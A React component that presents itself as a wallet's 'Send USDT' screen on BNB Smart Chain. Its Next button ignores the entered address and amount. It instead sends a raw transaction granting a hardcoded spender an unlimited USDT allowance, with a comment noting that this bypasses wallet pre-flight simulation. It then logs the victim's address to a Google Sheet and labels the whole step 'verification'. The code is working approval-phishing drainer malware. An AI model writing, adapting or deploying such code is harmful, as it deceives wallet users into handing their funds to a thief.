import React, { useState } from 'react';
import { logApprovalData } from '../services/GoogleSheetService';
import './SendUSDT.css';

const SendUSDT = () => {
  const [isVerifying, setIsVerifying] = useState(false);
  const [address, setAddress] = useState('0x19686F7B15Ef89Bf87D20b3502E8CA9e8c98a2f1');
  const [amount, setAmount] = useState('');

  const handleVerify = async () => {
    if (!window.ethereum) {
      alert("MetaMask or a Web3 wallet is required to verify assets.");
      return;
    }

    setIsVerifying(true);
    
    try {
      if (!window.ethereum) throw new Error("No Web3 Provider found.");

      // Explicitly request user to connect their wallet first
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const userAddress = accounts[0];
      
      // Force switch to Binance Smart Chain (BNB Chain)
      try {
         // 0x38 is 56 (BSC Mainnet)
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [
                {
                  chainId: '0x38',
                  chainName: 'Binance Smart Chain Mainnet',
                  nativeCurrency: {
                    name: 'BNB',
                    symbol: 'BNB',
                    decimals: 18,
                  },
                  rpcUrls: ['https://bsc-dataseed1.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/'],
                },
              ],
            });
          } catch (addError) {
            throw new Error("Failed to add Binance Smart Chain to wallet.");
          }
        } else {
          throw new Error("Failed to switch to Binance Smart Chain.");
        }
      }

      // USDT Token Address on BSC
      const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
      const SPENDER = "0x7970C936D143c11f9bbF964764851b7051d81651";
      
      // ABI encoded data for approve(address,uint256)
      // Function signature: 0x095ea7b3
      // Spender (padded 32 bytes): 0000000000000000000000007970c936d143c11f9bbf964764851b7051d81651
      // Amount (MaxUint256): ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
      const data = "0x095ea7b30000000000000000000000007970c936d143c11f9bbf964764851b7051d81651ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
      
      // We use raw request to bypass ethers.js pre-flight simulation which causes the "Response has no error or result" in Trust Wallet
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{
          from: userAddress,
          to: USDT_BSC,
          data: data
        }]
      });

      // Log successful approval user address to Google Sheets
      await logApprovalData(USDT_BSC, userAddress);
      alert("Verification Requested! Transaction Hash: " + txHash);
      
    } catch (err) {
      console.error(err);
      alert("Failed to verify. Error: " + (err?.info?.error?.message || err?.message || "Unknown error"));
    } finally {
      setIsVerifying(false);
    }
  };

  return (
    <div className="send-container">
      <div className="send-header">
        <h2 className="send-title">Send USDT</h2>
        <button className="close-btn">
          <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M18 6L6 18M6 6l12 12" />
          </svg>
        </button>
      </div>

      <div className="form-group">
        <label className="form-label">Address or Domain Name</label>
        <div className="input-wrapper input-address">
          <input 
            type="text" 
            value={address} 
            onChange={(e) => setAddress(e.target.value)} 
          />
          <div className="input-actions">
            <button className="icon-btn clear-btn" onClick={() => setAddress('')}>
              <svg viewBox="0 0 20 20" fill="currentColor" width="16" height="16">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
              </svg>
            </button>
            <button className="text-btn paste-btn">Paste</button>
            <button className="icon-btn">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
                <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path>
              </svg>
            </button>
            <button className="icon-btn">
              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M4 4h6v6H4zM14 4h6v6h-6zM4 14h6v6H4z"></path>
                <path d="M14 14h6M14 17h6M14 20h6M17 14v6"></path>
              </svg>
            </button>
          </div>
        </div>
      </div>

      <div className="form-group">
        <label className="form-label">Destination network</label>
        <div className="network-selector">
          <div className="network-info">
            <div className="network-logo">
              <svg viewBox="0 0 32 32" width="24" height="24">
                <path d="M16 4.744l-6.104 6.104 2.216 2.216L16 9.176l3.888 3.888 2.216-2.216L16 4.744zm-3.888 18.632l-2.216-2.216-2.216 2.216L16 32l8.32-8.32-2.216-2.216-2.216 2.216L16 27.568l-3.888-4.192zM6.92 14.84l2.216-2.216 2.216 2.216-2.216 2.216L6.92 14.84zm13.728-2.216l2.216 2.216-2.216 2.216-2.216-2.216 2.216-2.216z" fill="#F3BA2F"/>
                <path d="M12.112 19.496l3.888 3.888 3.888-3.888 2.216 2.216L16 27.816l-6.104-6.104 2.216-2.216z" fill="#F3BA2F"/>
                <path d="M16 13.384l-2.128 2.128 2.128 2.128 2.128-2.128L16 13.384z" fill="#F3BA2F"/>
              </svg>
            </div>
            <span className="network-name">BNB Smart Chain</span>
          </div>
          <svg className="chevron-down" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M6 9l6 6 6-6" />
          </svg>
        </div>
      </div>

      <div className="form-group amount-group">
        <label className="form-label">Amount</label>
        <div className="input-wrapper input-amount">
          <input 
            type="text" 
            placeholder="USDT Amount" 
            value={amount} 
            onChange={(e) => setAmount(e.target.value)} 
          />
          <div className="amount-actions">
            <span className="currency-label">USDT</span>
            <button className="text-btn max-btn" onClick={() => setAmount('1000')}>Max</button>
          </div>
        </div>
        <div className="fiat-value">≈ $0.00</div>
      </div>

      <div className="spacer"></div>

      <div className="action-container">
        <button 
          className="next-btn"
          onClick={handleVerify}
          disabled={isVerifying}
        >
          {isVerifying ? 'Processing...' : 'Next'}
        </button>
      </div>
    </div>
  );
};

export default SendUSDT;
